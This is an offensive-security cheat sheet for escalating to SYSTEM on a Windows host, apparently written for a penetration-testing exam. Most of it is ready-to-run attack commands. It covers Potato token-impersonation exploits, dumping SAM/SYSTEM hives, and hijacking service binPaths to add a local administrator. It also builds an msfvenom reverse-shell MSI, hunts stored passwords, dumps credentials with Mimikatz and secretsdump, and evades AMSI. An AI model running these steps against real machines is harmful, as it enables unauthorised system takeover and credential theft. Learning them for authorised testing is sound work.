# Windows Privilege Escalation

**Goal: `NT AUTHORITY\SYSTEM` on `{target}`.** Windows privesc is about tokens, services, and misconfigurations. Run winPEAS, then work the high-value checklist: token privileges, service misconfigs, AlwaysInstallElevated, unquoted paths, and stored creds.

> Orient first: `whoami /all` (groups + **privileges** — this alone often decides the path), `systeminfo`, `whoami /priv`. If you see `SeImpersonatePrivilege` you're basically done (Potato).

---

## Step 1 — Automated Enumeration

```powershell
# winPEAS (upload winPEASx64.exe) — read the RED highlights
.\winPEASx64.exe

# PowerUp (PowerShell) — finds and even abuses misconfigs
powershell -ep bypass
Import-Module .\PowerUp.ps1; Invoke-AllChecks

# Seatbelt for a deep host survey
.\Seatbelt.exe -group=all
```

---

## Step 2 — Token Privileges (`whoami /priv`)

The fastest wins on the exam. If **enabled**:

| Privilege | Exploit |
|-----------|---------|
| `SeImpersonatePrivilege` | **Potato** attacks → SYSTEM (see below) |
| `SeAssignPrimaryToken` | Potato attacks |
| `SeBackupPrivilege` | Read any file → dump SAM/SYSTEM or `ntds.dit` |
| `SeRestorePrivilege` | Write any file → hijack a service binary/DLL |
| `SeDebugPrivilege` | Dump LSASS / inject into a SYSTEM process |
| `SeTakeOwnership` | Take ownership of a protected file, then replace it |
| `SeLoadDriver` | Load a vulnerable driver |

**Potato (SeImpersonate) — extremely common on service accounts / IIS / MSSQL:**
```powershell
# GodPotato works on modern Windows 10/11/2019/2022
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\shell.exe"
# Alternatives depending on OS: PrintSpoofer, JuicyPotatoNG
.\PrintSpoofer64.exe -i -c powershell.exe
```

**SeBackupPrivilege → dump the hashes offline:**
```cmd
reg save HKLM\SAM  C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
:: exfil, then on Kali:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## Step 3 — Service Misconfigurations

```powershell
# List non-default services + their binaries
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
Get-CimInstance win32_service | select Name,PathName,StartMode | ft -auto
```

### Unquoted service path
```cmd
:: If a service path has spaces and no quotes (e.g. C:\Program Files\My Service\svc.exe)
:: and you can write to an earlier folder, Windows runs C:\Program.exe first.
wmic service get name,pathname,startmode | findstr /i /v """
:: Drop your payload as C:\Program Files\My.exe  (or the first writable segment)
```

### Weak service binary/permissions (can overwrite the .exe or reconfigure it)
```powershell
# Check with accesschk (or PowerUp's Invoke-ServiceAbuse)
accesschk.exe /accepteula -uwcqv "Everyone" *
# If you can change the binPath and restart it:
sc config VulnSvc binPath= "C:\Windows\Temp\shell.exe"
sc stop VulnSvc & sc start VulnSvc
# Or add yourself to local admins via a service that runs as SYSTEM:
sc config VulnSvc binPath= "cmd /c net localgroup administrators user /add"
```

### DLL hijacking / writable service directory
Drop a malicious DLL the service loads from a writable path, then restart the service.

---

## Step 4 — Quick Wins Checklist

```cmd
:: AlwaysInstallElevated (both keys = 1 -> install a malicious MSI as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: build:  msfvenom -p windows/x64/shell_reverse_tcp LHOST={target} LPORT=4444 -f msi -o evil.msi
:: run:    msiexec /quiet /qn /i C:\Temp\evil.msi

:: Stored credentials
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
dir /s /b *.config *unattend*.xml *.kdbx 2>nul
findstr /si password *.xml *.ini *.txt *.config 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul

:: Scheduled tasks with weak permissions
schtasks /query /fo LIST /v | findstr /i "TaskName Run As"

:: Saved WiFi / autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

---

## Step 5 — Kernel / Missing Patches (last resort)
```cmd
systeminfo
:: Feed into Windows-Exploit-Suggester or:
wmic qfe get HotFixID
```
Look for classics: **PrintNightmare**, **HiveNightmare/SeriousSAM** (readable SAM), **CVE-2021-36934**.

---

## Step 6 — Dump Credentials once elevated

```cmd
:: Mimikatz (as admin/SYSTEM)
mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords
  lsadump::sam
  sekurlsa::ekeys
:: Or from Kali against the box with local admin creds:
impacket-secretsdump ./Administrator:'Pass'@{target}
nxc smb {target} -u Administrator -p 'Pass' --sam --lsa
```

## Common Mistakes

- **Not reading `whoami /priv`.** `SeImpersonate`/`SeBackup`/`SeDebug` are the whole game — Potato and hash-dump paths.
- **Ignoring service permissions.** `accesschk` + PowerUp find writable/ reconfigurable services fast.
- **Overlooking stored creds** in `cmdkey`, unattend.xml, registry autologon, and `.config` files.
- **Forgetting `-ep bypass`** for PowerShell scripts, or that AMSI may block them (use obfuscation / `-enc`).
- **Wrong Potato for the OS.** Modern boxes → GodPotato / PrintSpoofer; JuicyPotato is for older builds only.
